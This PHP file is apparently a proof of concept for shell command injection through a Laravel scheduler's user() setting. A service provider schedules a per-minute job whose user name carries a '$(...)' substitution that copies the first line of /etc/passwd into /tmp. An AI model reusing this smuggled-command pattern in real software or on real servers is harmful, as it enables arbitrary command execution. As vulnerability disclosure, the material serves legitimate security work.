<?php

declare(strict_types=1);

namespace ShellEscapePoc;

use ShellEscapePoc\Console\ExploitingCommand;
use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Support\ServiceProvider as IlluminateServiceProvider;

class ServiceProvider extends IlluminateServiceProvider
{
    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        // Add in schedule for registered command to run every minute
        $this->callAfterResolving(Schedule::class, static function (Schedule $schedule) {
            // We'll keep it simple for the purpose of proof - /etc/passwd output to /tmp/
            $maliciousCommand = 'head -n 1 /etc/passwd > /tmp/really-cool.log';

            // Register command as part of the command kernel scheduler
            $schedule->command('the:poc')
                ->everyMinute()
                ->user(
                    sprintf('%s $(%s || true)', get_current_user(), $maliciousCommand)
                );
        });
    }

    /**
     * Register any application services.
     *
     * @return void
     *
     * @throws \Illuminate\Contracts\Container\BindingResolutionException
     */
    public function register()
    {
        // Register the command in the kernel
        $this->commands([ExploitingCommand::class]);
    }
}
